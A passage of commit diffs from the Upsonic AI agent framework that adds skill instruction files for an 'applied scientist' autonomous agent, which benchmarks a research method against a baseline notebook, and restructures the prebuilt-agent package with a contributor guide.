+   - Target variable and feature set
+
+2. **Extract dependencies:**
+   - Scan all import statements in the notebook.
+   - Write `{experiment_path}/current_requirements.txt` with one package per line (`package==version` if determinable, otherwise just `package`).
+
+3. **Read `{experiment_path}/current_data/`** (or, for code-based data, the download spec):
+   - Identify data format (CSV, parquet, etc.)
+   - Note number of rows, columns
+   - Note data types and any special handling
+
+4. **Append a Phase 1 entry to `{experiment_path}/log.json`** under `phases`:
+   ```json
+   {
+     "name": "Phase 1: Analyze Current",
+     "completed_at": "2026-04-17T10:15:00Z",
+     "model": "XGBoost",
+     "preprocessing": [
+       "Drop rows with NaN",
+       "LabelEncoder on target",
+       "LabelEncoder on categorical features",
+       "StandardScaler on numerical features"
+     ],
+     "training": {
+       "split": 0.2,
+       "seed": 42,
+       "stratified": true
+     },
+     "hyperparameters": {
+       "n_estimators": 200,
+       "max_depth": 6,
+       "learning_rate": 0.1
+     },
+     "metrics": {
+       "accuracy": 0.8726,
+       "f1":       0.7277,
+       "roc_auc":  0.9274
+     },
+     "target": "income",
+     "features_count": 14,
+     "data": {
+       "source": "ucimlrepo fetch_ucirepo(id=2)",
+       "format": "pandas.DataFrame",
+       "rows": 45222,
+       "cols": 14
+     },
+     "notes": "Data downloaded programmatically; both notebooks must use the same source."
+   }
+   ```
+
+   Do not overwrite earlier entries; append to the `phases` array.
+
+## Output
+- `{experiment_path}/log.json` — updated with complete Phase 1 analysis entry
+- `{experiment_path}/current_requirements.txt` — written
+- No other files created or modified
```

**File**: `prebuilt_autonomous_agents/applied_scientist/skills/benchmark/SKILL.md` (added, +70/-0)
```diff
@@ -0,0 +1,70 @@
+# Benchmark Skill
+
+## Purpose
+Define the comparison metrics and extract baseline values from the current implementation. Record them as a structured JSON entry so downstream phases and final evaluation can read them directly.
+
+## When to Use
+Phase 3 — after both current analysis and research analysis are complete.
+
+## Input
+| Parameter | Type | Description |
+|-----------|------|-------------|
+| experiment_path | path | `experiments/{research_name}/` |
+
+## Actions
+
+1. **Define comparison metrics:**
+   - Include ALL metrics already used in `current.ipynb`.
+   - Add any additional metrics that are relevant for the new method.
+   - For classification: accuracy, precision, recall, F1, AUC-ROC (as applicable).
+   - For regression: MSE, RMSE, MAE, R² (as applicable).
+   - Include training time if measurable.
+
+2. **Extract baseline values:**
+   - Read metric values from `current.ipynb` output cells.
+   - If a metric is not computed in the notebook, record it as `null` and set `"needs_computation": true` — both notebooks must then compute it.
+
+3. **Append a Phase 3 entry to `{experiment_path}/log.json`** under `phases`:
+   ```json
+   {
+     "name": "Phase 3: Benchmark",
+     "completed_at": "2026-04-17T10:45:00Z",
+     "metrics": [
+       {
+         "name": "accuracy",
+         "description": "Fraction of correctly classified samples.",
+         "higher_is_better": true,
+         "baseline": 0.8726,
+         "needs_computation": false
+       },
+       {
+         "name": "f1",
+         "description": "F1 score (binary, positive class).",
+         "higher_is_better": true,
+         "baseline": 0.7277,
+         "needs_computation": false
+       },
+       {
+         "name": "roc_auc",
+         "description": "Area under the ROC curve.",
+         "higher_is_better": true,
+         "baseline": 0.9274,
+         "needs_computation": false
+       },
+       {
+         "name": "training_time_seconds",
+         "description": "Wall-clock training time.",
+         "higher_is_better": false,
+         "baseline": null,
+         "needs_computation": true
+       }
+     ],
+     "notes": "training_time_seconds must be added to both notebooks for a fair comparison."
+   }
+   ```
+
+   Do not overwrite earlier entries; append to the `phases` array.
+
+## Output
+- `{experiment_path}/log.json` — updated with Phase 3 benchmark entry
+- Clear list (in `metrics`) of what the new implementation must compute
```

**File**: `prebuilt_autonomous_agents/applied_scientist/skills/evaluate/SKILL.md` (added, +111/-0)
```diff
@@ -0,0 +1,111 @@
+# Evaluate Skill
+
+## Purpose
+Compare baseline and new implementation results. Produce the machine-readable final report `result.json`, update `experiments.json`, and append a row to `comparison.json`.
+
+## When to Use
+Phase 5 — after the new implementation is complete and metrics are collected.
+
+## Input
+| Parameter | Type | Description |
+|-----------|------|-------------|
+| experiment_path | path | `experiments/{research_name}/` |
+| research_name | string | Name of this experiment |
+
+## Actions
+
+1. **Collect all metrics** from `log.json` (Phase 3 baseline entry + Phase 4 new method entry).
+
+2. **Determine verdict:**
+   - `BETTER`: new method outperforms baseline on the majority of key metrics
+   - `WORSE`: new method underperforms baseline on the majority of key metrics
+   - `INCONCLUSIVE`: mixed results or differences within noise margin
+   - `FAILED`: experiment could not produce comparable results (dependency failure, implementation crash, data incompatibility)
+
+3. **Write `{experiment_path}/result.json`** in the exact schema below. Always valid JSON; never leave fields undefined — use `null` for unknown values.
+
+   ```json
+   {
+     "name": "{research_name}",
+     "verdict": "BETTER",
+     "summary": "2-3 paragraphs explaining what the new method does, how it fundamentally differs from the baseline, and what trade-offs it makes.",
+     "explanation": "2-3 sentences explaining WHY this verdict was reached. Reference specific metrics and their differences. Be concrete — mention numbers, not vague statements.",
+     "comparison": {
+       "metrics": [
+         {
+           "name": "accuracy",
+           "current": 0.853,
+           "new":     0.872,
+           "diff":    0.019,
+           "diff_display": "+0.019",
+           "unit": null,
+           "higher_is_better": true,
+           "better": "new"
+         },
+         {
+           "name": "training_time_seconds",
+           "current": 2.0,
+           "new":     45.0,
+           "diff":    43.0,
+           "diff_display": "+43.0",
+           "unit": "seconds",
+           "higher_is_better": false,
+           "better": "current"
+         }
+       ]
+     },
+     "file_locations": {
+       "current_notebook":   "experiments/{research_name}/current.ipynb",
+       "current_data":       "experiments/{research_name}/current_data/",
+       "new_notebook":       "experiments/{research_name}/new.ipynb",
+       "research_source":    "experiments/{research_name}/research.pdf",
+       "experiment_log":     "experiments/{research_name}/log.json"
+     }
+   }
+   ```
+
+   ### Field rules
+   - `verdict`: exactly one of `"BETTER"`, `"WORSE"`, `"INCONCLUSIVE"`, `"FAILED"`.
+   - `summary` / `explanation`: plain text, no markdown headings. Short paragraphs only.
+   - `comparison.metrics[]`:
+     - `current` / `new` are numbers (or `null` if a side could not compute the metric).
+     - `diff = new - current` (raw number). `diff_display` is the short string with sign (`"+0.019"`, `"-0.03"`).
+     - `better`: `"new"` | `"current"` | `"tie"` | `null` — computed from `diff` and `higher_is_better`.
+     - `unit` is a short unit string (`"seconds"`, `"%"`, etc.) or `null`.
+   - `file_locations` uses paths relative to the experiments directory root. `research_source` must match whatever Phase 0 materialized — `research.pdf`, `research_source.{ext}`, or the `research_source/` directory for a cloned repo.
+
+4. **Update `experiments/experiments.json`:**
+   - Set `status` to `"completed"` (or `"failed"` if the experiment failed).
+   - Fill in `verdict`, `key_metric`, `baseline_model`, `new_method`.
+   - `key_metric` is an object: `{"name": "...", "baseline": <num>, "new": <num>}`.
+
+5. **Update `experiments/comparison.json`:**
+   - If the file does not exist, create it with `{"experiments": []}`.
+   - Append an entry:
+     ```json
+     {
+       "name": "{research_name}",
+       "date": "YYYY-MM-DD",
+       "baseline": "{baseline_model}",
+       "new_method": "{new_method}",
+       "key_metric": {"name": "accuracy", "baseline": 0.853, "new": 0.872},
+       "verdict": "BETTER"
+     }
+     ```
+
+6. **Update `{experiment_path}/log.json`** — append a Phase 5 entry:
+   ```json
+   {
+     "name": "Phase 5: Evaluate",
+     "completed_at": "2026-04-17T11:40:00Z",
+     "verdict": "BETTER",
+     "key_change": "accuracy +0.019 (new > current)",
+     "files_written": ["result.json", "experiments.json", "comparison.json"]
+   }
+   ```
+
+## Output
+- `{experiment_path}/result.json` — the final machine-readable report.
+- `experiments/experiments.json` — updated with this experiment's final verdict.
+- `experiments/comparison.json` — new row appended.
+- `log.json` — finalized with Phase 5 entry.
```

**File**: `prebuilt_autonomous_agents/applied_scientist/skills/experiment_management/SKILL.md` (added, +105/-0)
```diff
@@ -0,0 +1,105 @@
+# Experiment Management Skill
+
+## Purpose
+Set up and manage the experiment folder structure. This is Phase 0 — it runs before any analysis begins. All bookkeeping files are JSON (never markdown).
+
+## When to Use
+- At the very start of a new experiment
+- When updating `experiments.json` or `comparison.json` after an experiment completes
+
+## Input
+| Parameter | Type | Description |
+|-----------|------|-------------|
+| research_name | string | The experiment name **as given by the caller**. Use it verbatim — do not rename it, do not re-derive it from the source title. |
+| research_source | ref | A free-form reference describing the new method. The caller can pass anything that identifies the content — a local file path, any URL (blog post, arXiv, docs, Hugging Face page, …), a git repository, a Kaggle link, a paper ID, or **a plain text idea** describing the approach to try. Do not reject unusual values; investigate and fetch whatever was given, or, for pure text ideas, save the text verbatim. |
+| current_notebook | path | Path to the current baseline .ipynb |
+| current_data | ref \| placeholder | Path to the current dataset (file or directory), a short description of how the notebook loads data, **or** the literal placeholder `"(not provided — infer it from the current notebook's data-loading cells)"`. When you see that placeholder, read the current notebook yourself and infer the source from its data-loading cells; do not ask the user. |
+| experiments_directory | path | The directory (inside the workspace) where experiment folders live (e.g. `./experiments`). |
+
+## Actions
+
+### Setup (start of experiment)
+
+1. **Create experiment directory:**
+   ```
+   experiments/{research_name}/
+   ```
+
+2. **Copy baseline files (NEVER move, NEVER modify originals):**
+   ```bash
+   cp {current_notebook} experiments/{research_name}/current.ipynb
+   # Only when current_data is a real path on disk:
+   cp -r {current_data}  experiments/{research_name}/current_data/
+   ```
+
+   Resolve `{current_data}` as follows before copying:
+
+   - **Real local path** (file or directory that exists on disk) → `cp` / `cp -r` it into `current_data/`.
+   - **Short description of a code-based download** (e.g. `"downloaded in notebook (ucimlrepo, id=2)"`) → leave `current_data/` empty and record the description verbatim in `log.json.metadata.original_data`.
+   - **Placeholder `"(not provided — infer it from the current notebook's data-loading cells)"`** → open `current.ipynb` yourself, scan for data-loading cells (`pd.read_csv`, `fetch_openml`, `fetch_ucirepo`, `load_dataset`, `kaggle.api...`, `urllib`/`requests` downloads, `np.load`, local paths, …), write down the exact loader you found as `log.json.metadata.original_data`, and make sure Phase 4's `new.ipynb` uses the same loader. Do not ask the user for clarification — do the investigation yourself.
+
+3. **Materialize the research source.** `{research_source}` can be anything — a local file, a URL of any kind, a git or Kaggle link, an arXiv / paper ID, a Hugging Face page, **or a plain text idea** describing the method to try. Your job is to bring its content into the experiment folder using whatever tool fits:
+
+   - **Investigate first.** Check if the value is a path on disk (`ls` / `test -e`); if it looks like a URL, poke it with `curl -I`; look at the hostname; read any hint in the value itself. If the value does not look like a path or URL at all, treat it as a **text idea** (see below). Do not rely on a fixed detection list.
+   - **Retrievable source** → fetch it with the most appropriate tool: `cp`, `git clone --depth 1`, `curl -L` / `wget`, `kaggle kernels pull …` / `kaggle datasets download …`, `huggingface-cli`, an arXiv PDF helper, Python downloaders, or anything else available. Install a missing CLI with `pip install` / `uv pip install` if it is the right tool for this source.
+   - **Text idea** → do not fabricate a paper or URL. Save the description verbatim to `experiments/{research_name}/research_source.md` (optionally with a leading `# Idea` heading) and let Phase 2 turn it into a concrete implementation plan.
+   - **Pick a sensible local name** based on what you actually produced:
+     - A single PDF → `experiments/{research_name}/research.pdf`
+     - Any other single file (including a text idea) → `experiments/{research_name}/research_source.{ext}` (`.md` for ideas; preserve the real extension for files you copied)
+     - Multiple files or a cloned repo / dataset → `experiments/{research_name}/research_source/` (a directory)
+     - A fetched HTML page → `research_source.html`, optionally with a cleaned `research_source.md` and/or a linked `research.pdf`
+   - **Choose your own `research_source_kind` label** to describe what you did (e.g. `pdf`, `file`, `git`, `kaggle_notebook`, `kaggle_dataset`, `arxiv`, `huggingface_model`, `html`, `idea`, `other`). This label is just for observability — there is no closed enum.

```

**File**: `prebuilt_autonomous_agents/applied_scientist/skills/implement/SKILL.md` (added, +93/-0)
```diff
@@ -0,0 +1,93 @@
+# Implement Skill
+
+## Purpose
+Create a new Jupyter notebook implementing the method from the research paper, using the same data as the baseline. Record implementation details and measured metrics as a structured JSON entry.
+
+## When to Use
+Phase 4 — after benchmark metrics are defined and baseline values are extracted.
+
+## Input
+| Parameter | Type | Description |
+|-----------|------|-------------|
+| experiment_path | path | `experiments/{research_name}/` |
+
+## Actions
+
+1. **Install dependencies:**
+   - Install any new packages identified in Phase 2.
+   - Capture installed package names and versions for the log entry below.
+
+2. **Write `{experiment_path}/new_requirements.txt`:**
+   - List all packages the new notebook needs (one per line, `package==version`).
+   - Include both existing dependencies and new ones from the paper.
+
+3. **Create `{experiment_path}/new.ipynb`** with this structure:
+
+   ```
+   [Markdown] # {Research Name} - New Method Implementation
+   [Markdown] ## 1. Setup & Imports
+   [Code]     import statements + dependency checks
+
+   [Markdown] ## 2. Data Loading
+   [Code]     load from experiments/{research_name}/current_data/
+              (use the SAME data loading logic as current.ipynb)
+
+   [Markdown] ## 3. Data Preprocessing
+   [Code]     preprocessing as required by the new method
+              (note any differences from baseline preprocessing)
+
+   [Markdown] ## 4. Model Implementation
+   [Code]     implement the new method from the paper
+
+   [Markdown] ## 5. Training
+   [Code]     train the model
+              (use same train/test split as baseline for fair comparison)
+
+   [Markdown] ## 6. Evaluation
+   [Code]     compute ALL comparison metrics defined in Phase 3
+
+   [Markdown] ## 7. Results Summary
+   [Code]     print all metrics in a structured format
+   ```
+
+4. **Implementation rules:**
+   - Use the SAME train/test split (same random seed, same ratio) as the baseline.
+   - Use the SAME data — load from `current_data/`, do not download new data.
+   - Compute ALL metrics defined in Phase 3 (including any with `"needs_computation": true`).
+   - Add timing measurements for training (`training_time_seconds`).
+   - Handle errors gracefully — if the method fails, log why.
+   - **Efficiency:** if data is large (100K+ rows), sample it to a manageable size (10K–30K rows). Both notebooks must use the exact same sample. Use paper's recommended hyperparameters — do not run exhaustive grid searches. If training takes more than 10 minutes, reduce data size or simplify config. The goal is a fair comparison, not a production model.
+
+5. **Run the notebook** end-to-end and verify it executes without errors.
+
+6. **Append a Phase 4 entry to `{experiment_path}/log.json`** under `phases`:
+   ```json
+   {
+     "name": "Phase 4: Implement",
+     "completed_at": "2026-04-17T11:30:00Z",
+     "new_dependencies_installed": [
+       {"name": "catboost", "version": "1.2.5"}
+     ],
+     "training": {
+       "split": 0.2,
+       "seed": 42,
+       "stratified": true
+     },
+     "metrics": {
+       "accuracy": 0.8721,
+       "f1":       0.7310,
+       "roc_auc":  0.9288,
+       "training_time_seconds": 45.2
+     },
+     "notebook_executed": true,
+     "errors":   [],
+     "warnings": []
+   }
+   ```
+
+   Do not overwrite earlier entries; append to the `phases` array.
+
+## Output
+- `{experiment_path}/new.ipynb` — complete, executed notebook
+- `{experiment_path}/new_requirements.txt` — written
+- `{experiment_path}/log.json` — updated with Phase 4 implementation entry
```

**File**: `prebuilt_autonomous_agents/applied_scientist/skills/progress/SKILL.md` (added, +72/-0)
```diff
@@ -0,0 +1,72 @@
+# Progress Skill
+
+## Purpose
+Maintain a **machine-readable** progress file so dashboards, CLIs, and notebooks can poll the experiment's state at any time. The file is a JSON document — never markdown, never human-prose-first.
+
+## When to Use
+**Constantly.** This skill is not a phase — it runs alongside every phase. You must overwrite `progress.json` at these moments:
+
+1. **Phase start** — when you begin a new phase
+2. **Phase end** — when you complete a phase
+3. **Before long operations** — before training a model, installing dependencies, reading a large PDF
+4. **On failure** — immediately when something goes wrong
+5. **On completion** — when the full experiment finishes
+
+## File Location
+```
+experiments/{research_name}/progress.json
+```
+
+## Format (CANONICAL — emit exactly)
+
+The file is **overwritten** each time (not appended). It is always the full current snapshot. Use UTC ISO-8601 timestamps. Match this schema **byte-for-byte** — do not invent alternative field names, do not use a dict where a list is specified, do not translate status values to synonyms.
+
+```json
+{
+  "name": "{research_name}",
+  "status": "RUNNING",
+  "started_at": "2026-04-17T10:00:00Z",
+  "updated_at": "2026-04-17T10:25:00Z",
+  "phases": [
+    {"index": 0, "name": "Setup",           "status": "done",    "summary": "Copied notebook, data, paper."},
+    {"index": 1, "name": "Analyze Current", "status": "done",    "summary": "Baseline is XGBoost, 85.3% accuracy."},
+    {"index": 2, "name": "Research",        "status": "current", "summary": null},
+    {"index": 3, "name": "Benchmark",       "status": "pending", "summary": null},
+    {"index": 4, "name": "Implement",       "status": "pending", "summary": null},
+    {"index": 5, "name": "Evaluate",        "status": "pending", "summary": null}
+  ],
+  "current_activity": "Reading research.pdf — extracting method summary and requirements.",
+  "issues": []
+}
+```
+
+### Field rules (strict)
+
+- **`status`** is one of: `"RUNNING"`, `"COMPLETED"`, `"FAILED"`. Uppercase. Nothing else.
+- **`phases`** is a **JSON array**, never an object. Exactly six elements, in order: Setup, Analyze Current, Research, Benchmark, Implement, Evaluate. Use those exact `name` values.
+- **`phases[].status`** is one of: `"done"`, `"current"`, `"pending"`, `"failed"`. Lowercase. Do **not** use `"completed"`, `"in_progress"`, `"todo"`, or any other synonym.
+- **`phases[].index`** is a 0-based integer matching the position in the array.
+- Exactly one phase may have `status == "current"` while the top-level `status == "RUNNING"`. On `COMPLETED` / `FAILED`, no phase should be `"current"`.
+- **`phases[].summary`** is one short sentence, or `null` if the phase has not run yet.
+- **`current_activity`** is one or two sentences describing what is happening **right now**.
+- **`issues`** is an array of short strings; use `[]` when clean, never `null`.
+- Do **not** add extra top-level keys (e.g. `current_phase`), and do not use dict-of-phases shapes like `{"phase_0_setup": {...}}`.
+
+## Rules
+
+1. **Overwrite, don't append.** The file is a snapshot, not a log. `log.json` is the log.
+2. **Valid JSON only.** Never write partial/invalid JSON. Write to a temp file and rename if needed.
+3. **Update before, not after.** Update progress BEFORE starting a long operation. The user wants to know what's happening now, not what already happened.
+4. **Be honest about failures.** On error, immediately set `status = "FAILED"`, mark the current phase `"failed"`, and append a message to `issues`.
+5. **Always refresh `updated_at`** — a stale timestamp tells the user nothing is moving.
+
+## Lifecycle
+
+| Moment | Action |
+|--------|--------|
+| Phase 0 starts | Create `progress.json`, `status="RUNNING"`, all phases `pending`, Phase 0 → `current`, set `started_at` + `updated_at` |
+| Phase N starts | Previous phase → `done` with one-line `summary`; Phase N → `current`; refresh `current_activity` + `updated_at` |
+| Long operation starts | Update `current_activity` (e.g. `"Training model — this may take a few minutes"`) + `updated_at` |
+| Phase N ends | Mark Phase N → `done` with one-line `summary` |
+| Experiment completes | All phases `done`, `status="COMPLETED"`, `current_activity="Done. See result.json."` |
+| Experiment fails | `status="FAILED"`, current phase → `"failed"`, `issues` populated, `current_activity` describes the error |
```

---

### Incident Patch 8: `4a447157` (2026-05-04)
**Commit Message**: standardize layout under src/upsonic/prebuilt  (#580)

* refactor(prebuilt): standardize layout under src/upsonic/prebuilt

Move the base class into the prebuilt package and rename it to
PrebuiltAutonomousAgentBase. Replace the monolithic upsonic_prebuilt_agents.py
with per-agent folders (agent.py + template/), starting with applied_scientist.

* docs: add new_prebuilt_agent_adding guide under documents/

Update references in CLAUDE.md and src/upsonic/prebuilt/__init__.py
to point at the new location.

**File**: `CLAUDE.md` (modified, +9/-2)
```diff
@@ -1,3 +1,8 @@
+---
+description: 
+alwaysApply: true
+---
+
 # CLAUDE.md
 
 This file provides guidance to Claude Code (claude.ai/code) when working with code in this repository.
@@ -18,6 +23,7 @@ Upsonic is a reliability-focused AI agent framework for building production-read
 - **Storage**: Multi-provider storage system in `src/upsonic/storage/` (In-Memory, JSON, SQLite, Redis, PostgreSQL, MongoDB)
 - **Team/Multi-Agent**: Team coordination and delegation in `src/upsonic/team/`
 - **Knowledge Base & RAG**: Document processing and retrieval in `src/upsonic/knowledge_base/` and `src/upsonic/rag/`
+- **Prebuilt Autonomous Agents**: Ready-to-run agents that bundle a system prompt, first-message template, and skills under `src/upsonic/prebuilt/<agent>/template/`. The shared base class lives in `src/upsonic/prebuilt/prebuilt_agent_base.py`. To add a new prebuilt, follow `documents/ai/guides/new_prebuilt_agent_adding.md`.
 
 ### Main Entry Points
 
@@ -120,6 +126,7 @@ Key environment variables:
 
 - Source code: `src/upsonic/`
 - Tests: `tests/`
-- Documentation: `README.md`, inline docstrings
+- Documentation: `README.md`, inline docstrings, and contributor guides under `documents/`
+  - `documents/ai/guides/new_prebuilt_agent_adding.md` — how to add a new prebuilt autonomous agent (file layout, base-class wiring, template conventions).
 - Configuration: `pyproject.toml`, `.pre-commit-config.yaml`, `pytest.ini`
-- Dependencies: Managed by `uv` with `uv.lock`
\ No newline at end of file
+- Dependencies: Managed by `uv` with `uv.lock`
```

**File**: `README.md` (modified, +1/-1)
```diff
@@ -64,7 +64,7 @@ All file and shell operations are restricted to `workspace`. Path traversal and
 
 ### Use Our Prebuilt Ones
 
-Prebuilt autonomous agents are ready-to-run agents built by the Upsonic community, each packaging a skill, system prompt, and first message so you can go from install to running in seconds. The collection is [open to contributions](https://github.com/Upsonic/Upsonic/tree/master/prebuilt_autonomous_agents), bring your agent and open a PR.
+Prebuilt autonomous agents are ready-to-run agents built by the Upsonic community, each packaging a skill, system prompt, and first message so you can go from install to running in seconds. The collection is [open to contributions](https://github.com/Upsonic/Upsonic/tree/master/src/upsonic/prebuilt), bring your agent and open a PR.
 
 Learn more: [Prebuilt Autonomous Agents](https://docs.upsonic.ai/concepts/prebuilt-autonomous-agents/overview)
 
```

**File**: `documents/ai/guides/new_prebuilt_agent_adding.md` (added, +314/-0)
```diff
@@ -0,0 +1,314 @@
+# Adding a New Prebuilt Autonomous Agent
+
+This guide is the canonical reference for shipping a new prebuilt autonomous
+agent inside Upsonic. A *prebuilt* is a ready-to-run agent that bundles its
+own system prompt, first-message template, and skills as files under
+`src/upsonic/prebuilt/<your_agent>/template/`, and exposes a small Python
+class that wires those files to
+[`PrebuiltAutonomousAgentBase`](../../src/upsonic/prebuilt/prebuilt_agent_base.py).
+
+If you only want to *use* an existing prebuilt, see the README — this
+document is for contributors adding new ones.
+
+---
+
+## 1. Mental model
+
+```
+┌──────────────────────────────────────────────────────────────────────┐
+│ Runtime layer:  PrebuiltAutonomousAgentBase  (clones template into   │
+│                                                a per-run workspace,  │
+│                                                reads system_prompt   │
+│                                                + first_message,      │
+│                                                renders, runs)        │
+├──────────────────────────────────────────────────────────────────────┤
+│ Agent class:    YourAgent(PrebuiltAutonomousAgentBase)               │
+│                 ├── AGENT_REPO   = "https://github.com/Upsonic/..."  │
+│                 ├── AGENT_FOLDER = "src/upsonic/prebuilt/your/template"│
+│                 └── new_<X>(...) — high-level, template-aware API    │
+├──────────────────────────────────────────────────────────────────────┤
+│ Template:       src/upsonic/prebuilt/<your_agent>/template/          │
+│                 ├── system_prompt.md        (required)               │
+│                 ├── first_message.md        (required, with {})      │
+│                 └── skills/<skill_name>/SKILL.md  (one or more)      │
+└──────────────────────────────────────────────────────────────────────┘
+```
+
+The base class clones the `template/` folder fresh from GitHub on every
+`run()`. That means **the template you ship must live in the public Upsonic
+repository on `master`** — local-only edits won't be picked up by the agent
+at run time. (You can override `agent_repo` to point at a fork while
+developing.)
+
+---
+
+## 2. Canonical file layout
+
+Every prebuilt agent has the exact same shape:
+
+```
+src/upsonic/prebuilt/
+├── __init__.py                          # re-exports your agent class
+├── prebuilt_agent_base.py               # do NOT edit; shared base class
+└── <your_agent>/
+    ├── __init__.py                      # lazy imports for your sub-package
+    ├── agent.py                         # YourAgent + any helper classes
+    └── template/
+        ├── system_prompt.md
+        ├── first_message.md
+        └── skills/
+            ├── <skill_a>/SKILL.md
+            ├── <skill_b>/SKILL.md
+            └── ...
+```
+
+Use `applied_scientist/` as a working reference whenever this doc is
+ambiguous — it is the original prebuilt and is kept canonical.
+
+---
+
+## 3. Step-by-step: shipping a new prebuilt
+
+### 3.1 Pick the folder name
+
+Use a snake-case noun describing the role of the agent — e.g.
+`applied_scientist`, `code_reviewer`, `release_manager`. The folder name
+becomes the user-facing import path
+(`from upsonic.prebuilt import YourAgent`) so prefer something short and
+unambiguous.
+
+### 3.2 Author the template files
+
+Create `src/upsonic/prebuilt/<your_agent>/template/` and put the prompts
+inside.
+
+**`system_prompt.md`** — full system prompt for the agent. This is rendered
+verbatim, then wrapped by the autonomous-agent harness with workspace,
+filesystem, and shell instructions. Keep it self-contained; it is what the
+model sees on every turn.
+
+**`first_message.md`** — the very first user-style message sent to the
+agent. Use Python `str.format` placeholders (`{name}`, `{research_source}`,
+…) for any value the caller supplies at run time. The base class extracts
+the placeholder set and raises `ValueError` if the caller forgets one, so
+you do not need to hand-validate kwargs.
+
+```markdown
+# first_message.md
+New experiment.
+
+**Experiment name:** {research_name}
+**Research source:** {research_source}
+**Current notebook:** {current_notebook}
+```
+
+**`skills/<skill_name>/SKILL.md`** — Anthropic-style skill files. Each is a
+self-contained, scoped capability the agent loads on demand. The base class
+copies the entire `skills/` tree into the workspace untouched, so anything
+the system prompt references by relative path will be found.
+
+### 3.3 Subclass the base in `agent.py`
+
+```python
+# src/upsonic/prebuilt/<your_agent>/agent.py
+from __future__ import annotations
+from typing import Any, Optional, Union, TYPE_CHECKING
+
+from upsonic.prebuilt.prebuilt_agent_base import PrebuiltAutonomousAgentBase
+
+if TYPE_CHECKING:
+    from upsonic.models import Model
+
+
+class YourAgent(PrebuiltAutonomousAgentBase):
+    """Short docstring describing the agent and its high-level API."""
+
+    AGENT_REPO
```

**File**: `src/upsonic/__init__.py` (modified, +5/-5)
```diff
@@ -96,8 +96,8 @@ def _get_RalphLoop():
 def _get_AutonomousAgent():
     return _lazy_import("upsonic.agent.autonomous_agent.autonomous_agent", "AutonomousAgent")()
 
-def _get_PrebuiltAutonomousAgent():
-    return _lazy_import("upsonic.agent.prebuilt_autonomous_agent.prebuilt_autonomous_agent", "PrebuiltAutonomousAgent")()
+def _get_PrebuiltAutonomousAgentBase():
+    return _lazy_import("upsonic.prebuilt.prebuilt_agent_base", "PrebuiltAutonomousAgentBase")()
 
 def hello() -> str:
     return "Hello from upsonic!"
@@ -132,8 +132,8 @@ def __getattr__(name: str) -> Any:
         return _get_RalphLoop()
     elif name == "AutonomousAgent":
         return _get_AutonomousAgent()
-    elif name == "PrebuiltAutonomousAgent":
-        return _get_PrebuiltAutonomousAgent()
+    elif name == "PrebuiltAutonomousAgentBase":
+        return _get_PrebuiltAutonomousAgentBase()
     
     # All other imports must come from sub-modules
     raise AttributeError(
@@ -149,7 +149,7 @@ def __getattr__(name: str) -> Any:
     "Clanker",
     "Agent",
     "AutonomousAgent",
-    "PrebuiltAutonomousAgent",
+    "PrebuiltAutonomousAgentBase",
     "Graph",
     "Team",
     "Chat",
```

**File**: `src/upsonic/agent/prebuilt_autonomous_agent/__init__.py` (removed, +0/-39)
```diff
@@ -1,39 +0,0 @@
-"""
-Prebuilt Autonomous Agent module for the Upsonic AI Agent Framework.
-
-Extends :class:`~upsonic.agent.autonomous_agent.AutonomousAgent` to bootstrap
-its system prompt and first message from a git repo subfolder and expose
-run / run_async / run_stream / run_stream_async / run_console entry points.
-"""
-from __future__ import annotations
-
-from typing import TYPE_CHECKING, Any
-
-if TYPE_CHECKING:
-    from .prebuilt_autonomous_agent import PrebuiltAutonomousAgent
-
-
-def _get_classes() -> dict[str, Any]:
-    """Lazy import of prebuilt autonomous agent classes."""
-    from .prebuilt_autonomous_agent import PrebuiltAutonomousAgent
-
-    return {
-        "PrebuiltAutonomousAgent": PrebuiltAutonomousAgent,
-    }
-
-
-def __getattr__(name: str) -> Any:
-    """Lazy loading of prebuilt autonomous agent classes."""
-    classes = _get_classes()
-    if name in classes:
-        return classes[name]
-
-    raise AttributeError(
-        f"module '{__name__}' has no attribute '{name}'. "
-        f"Available: {list(classes.keys())}"
-    )
-
-
-__all__ = [
-    "PrebuiltAutonomousAgent",
-]
```

**File**: `src/upsonic/prebuilt/__init__.py` (modified, +17/-6)
```diff
@@ -1,10 +1,14 @@
 """
 Upsonic prebuilt agents.
 
-Ready-to-use autonomous agents backed by templates in the
-``Upsonic/AutonomousAgents`` repository. Each class auto-wires the repo and
-folder and exposes a template-aware API on top of
-:class:`~upsonic.agent.prebuilt_autonomous_agent.PrebuiltAutonomousAgent`.
+Ready-to-use autonomous agents whose system prompt, first-message template,
+and skills are bundled inside this package. Each prebuilt lives in its own
+subfolder (e.g. ``applied_scientist/``) with the source code in
+``agent.py`` and the agent's prompt template in ``template/``.
+
+Every prebuilt class is a subclass of
+:class:`~upsonic.prebuilt.prebuilt_agent_base.PrebuiltAutonomousAgentBase`,
+which clones the template folder into the user's workspace on every run.
 
 Usage:
     ```python
@@ -24,26 +28,32 @@
     )
     exp.run()
     ```
+
+See ``documents/ai/guides/new_prebuilt_agent_adding.md`` for instructions on how to
+contribute a new prebuilt agent.
 """
 from __future__ import annotations
 
 from typing import TYPE_CHECKING, Any
 
 if TYPE_CHECKING:
-    from .upsonic_prebuilt_agents import (
+    from .prebuilt_agent_base import PrebuiltAutonomousAgentBase
+    from .applied_scientist.agent import (
         AppliedScientist,
         Experiment,
         ExperimentResult,
     )
 
 
 def _get_classes() -> dict[str, Any]:
-    from .upsonic_prebuilt_agents import (
+    from .prebuilt_agent_base import PrebuiltAutonomousAgentBase
+    from .applied_scientist.agent import (
         AppliedScientist,
         Experiment,
         ExperimentResult,
     )
     return {
+        "PrebuiltAutonomousAgentBase": PrebuiltAutonomousAgentBase,
         "AppliedScientist": AppliedScientist,
         "Experiment": Experiment,
         "ExperimentResult": ExperimentResult,
@@ -61,6 +71,7 @@ def __getattr__(name: str) -> Any:
 
 
 __all__ = [
+    "PrebuiltAutonomousAgentBase",
     "AppliedScientist",
     "Experiment",
     "ExperimentResult",
```

**File**: `src/upsonic/prebuilt/applied_scientist/__init__.py` (added, +68/-0)
```diff
@@ -0,0 +1,68 @@
+"""
+AppliedScientist prebuilt autonomous agent.
+
+The agent's system prompt, first-message template, and skills live under
+``template/`` and are pulled into the runtime workspace at run time by
+:class:`~upsonic.prebuilt.prebuilt_agent_base.PrebuiltAutonomousAgentBase`.
+
+Usage:
+    ```python
+    from upsonic.prebuilt import AppliedScientist
+
+    scientist = AppliedScientist(model="openai/gpt-4o", workspace="./ws")
+    exp = scientist.new_experiment(
+        name="tabpfn_adult",
+        research_source="example_1/tabpfn.pdf",
+        current_notebook="example_1/baseline.ipynb",
+    )
+    exp.run()
+    ```
+"""
+from __future__ import annotations
+
